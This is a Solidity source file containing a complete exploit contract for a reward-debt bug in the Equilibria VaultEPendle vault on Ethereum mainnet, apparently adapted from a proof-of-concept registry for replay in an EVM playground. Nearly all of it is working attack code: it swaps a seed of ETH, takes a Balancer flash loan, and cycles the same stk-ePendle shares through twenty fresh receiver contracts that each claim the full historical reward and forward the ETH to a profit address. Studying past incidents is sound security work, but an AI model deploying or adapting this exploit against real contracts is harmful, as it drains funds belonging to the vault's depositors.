// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../interface.sol";

// Equilibria VaultEPendle (stk-ePendle) reward-debt bug, Ethereum mainnet,
// Aug 2025. Standalone synthetic exploit for the EVM Playground recorder:
// the real Foundry PoC runs the attack inline from ContractTest.testExploit()
// via a helper `EquilibriaEPendleAttacker` contract (see the registry's
// EquilibriaEPendle_exp.sol) — this version drops the forge-std `Test`
// dependent wrapper and exposes a single payable `execute()` entrypoint that
// the recorder deploys and calls directly, carrying the ETH seed as call
// value instead of a constructor payment (the playground harness cannot send
// value with a deployment).
//
// Attack summary: VaultEPendle never settles a holder's reward debt
// (userRewardPerTokenPaid) on a plain ERC20 transfer of stk-ePendle shares,
// and its public getReward(address) recomputes rewards for ANY account from
// that account's CURRENT balance. So the same share balance can be paraded
// through N freshly-deployed receiver contracts, each of which the vault
// credits with the FULL historical reward stream (rewardPerTokenStored) as
// if it had held the shares since inception, and pays out as native ETH.

address constant VAULT_EPENDLE_PROXY = 0xd30d6fD662c0d92B49F3C3E478e125BA1D968059;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address payable constant WETH_TOKEN = payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
address constant PENDLE = 0x808507121B80c02388fAd14726482e061B8da827;
address constant EPENDLE = 0x22Fc5A29bd3d6CCe19a06f844019fd506fCe4455;
address constant EQB = 0xfE80D611c6403f70e5B1b9B722D2B3510B740B2B;
address constant XEQB = 0xd6eCfD0d5f1Dfd3ad30f267a3a29b3E1bC4fd54f;
address constant EPENDLE_DEPOSITOR = 0xa94603c910A95e0cC5a70b84558e21E711342D63;

bytes32 constant WETH_PENDLE_POOL_ID = 0xfd1cf6fd41f229ca86ada0584c63c49c3d66bbc9000200000000000000000438;

interface IEquilibriaVault is IERC20 {
    function depositAll() external returns (uint256);
    function withdrawAll() external returns (uint256);
    function getReward(
        address account
    ) external;
    function harvest() external;
}

interface IEPendleDepositor {
    function deposit(
        uint256 amount
    ) external returns (uint256);
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract EquilibriaEPendleAttacker is IBalancerFlashLoanRecipient {
    address payable private immutable profitReceiver;

    constructor(
        address payable profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    receive() external payable {}

    // Recorded entrypoint. Carries the 0.01 ETH seed as call value (the real
    // tx sent it with the CREATE that deployed the attack contract; the
    // playground recorder sends call value only on the recorded call, so the
    // seed arrives here instead — the mechanics below are identical either way).
    function execute() external payable {
        // step 1: convert the ETH seed into PENDLE and deposit it as ePendle.
        uint256 seedEth = address(this).balance;
        IWETH(WETH_TOKEN).deposit{value: seedEth}();
        IERC20(WETH_TOKEN).approve(BALANCER_VAULT, seedEth);

        uint256 pendleOut = _balancerSwap(WETH_TOKEN, PENDLE, seedEth);
        IERC20(PENDLE).approve(EPENDLE_DEPOSITOR, pendleOut);
        IEPendleDepositor(EPENDLE_DEPOSITOR).deposit(pendleOut);

        // step 2: harvest once so VaultEPendle holds the native rewards that
        // will be repeatedly claimed below.
        IEquilibriaVault(VAULT_EPENDLE_PROXY).harvest();

        // step 3: borrow the Balancer ePendle liquidity used to mint a large
        // stk-ePendle share balance (amplifies the per-cycle claim; not
        // required for the underlying bug).
        address[] memory tokens = new address[](1);
        tokens[0] = EPENDLE;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = IERC20(EPENDLE).balanceOf(BALANCER_VAULT);
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "not balancer");
        require(tokens.length == 1 && tokens[0] == EPENDLE, "unexpected flash loan");

        // step 4: deposit all ePendle and mint the stk-ePendle shares that
        // will be paraded through fresh receivers.
        IERC20(EPENDLE).approve(VAULT_EPENDLE_PROXY, type(uint256).max);
        IEquilibriaVault(VAULT_EPENDLE_PROXY).depositAll();
        uint256 shareAmount = IERC20(VAULT_EPENDLE_PROXY).balanceOf(address(this));

        // step 5: each fresh receiver has zero reward debt, so the same
        // transferred shares can claim the full historical reward again.
        for (uint256 i = 0; i < 20; i++) {
            RewardReceiver receiver = new RewardReceiver(profitReceiver);
            IERC20(VAULT_EPENDLE_PROXY).transfer(address(receiver), shareAmount);
            IEquilibriaVault(VAULT_EPENDLE_PROXY).getReward(address(receiver));
            IERC20(VAULT_EPENDLE_PROXY).transferFrom(address(receiver), address(this), shareAmount);
            receiver.exit();
        }

        // step 6: withdraw ePendle and repay the flash loan.
        IEquilibriaVault(VAULT_EPENDLE_PROXY).withdrawAll();
        IERC20(EPENDLE).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function _balancerSwap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) private returns (uint256 amountOut) {
        IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
            poolId: WETH_PENDLE_POOL_ID,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: tokenIn,
            assetOut: tokenOut,
            amount: amountIn,
            userData: ""
        });
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        amountOut = IBalancerVault(BALANCER_VAULT).swap(singleSwap, funds, 0, block.timestamp);
    }
}

contract RewardReceiver {
    address payable private immutable profitReceiver;

    constructor(
        address payable profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
        IERC20(VAULT_EPENDLE_PROXY).approve(msg.sender, type(uint256).max);
    }

    receive() external payable {
        (bool success,) = profitReceiver.call{value: msg.value}("");
        require(success, "eth forward failed");
    }

    function exit() external {
        IERC20(XEQB).transfer(VAULT_EPENDLE_PROXY, IERC20(XEQB).balanceOf(address(this)));
        IERC20(EQB).transfer(VAULT_EPENDLE_PROXY, IERC20(EQB).balanceOf(address(this)));
    }
}
